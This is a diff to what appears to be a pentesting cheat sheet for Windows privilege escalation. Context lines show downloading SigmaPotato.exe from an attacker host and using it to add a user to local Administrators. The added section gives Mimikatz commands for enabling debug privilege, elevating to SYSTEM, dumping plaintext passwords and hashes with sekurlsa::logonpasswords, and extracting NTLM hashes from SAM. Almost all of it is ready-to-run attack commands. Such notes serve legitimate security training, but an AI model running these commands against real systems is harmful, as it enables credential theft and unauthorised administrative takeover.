@@ -29,3 +29,23 @@ iwr -uri http://$(IP_ADDRESS)/SigmaPotato.exe -OutFile SigmaPotato.exe
 ```powershell
 .\SigmaPotato "net localgroup Administrators dave4 /add"
 ```
+# Mimikatz
+If a user has either of the following privileges, mimikatz can be used:
+* SeImpersonatePrivilege
+* SeDebugPrivilege
+Enable SeDebugPrivilege (require for dumping passwords):
+```
+privilege::debug
+```
+Elevate privileges to SYSTEM (also required):
+```
+token::elevate
+```
+Dump plaintext and hashed passwords from ALL sources:
+```
+sekurlsa::logonpasswords
+```
+Dump only NTLM hashes from SAM database:
+```
+lsadump::sam
+```
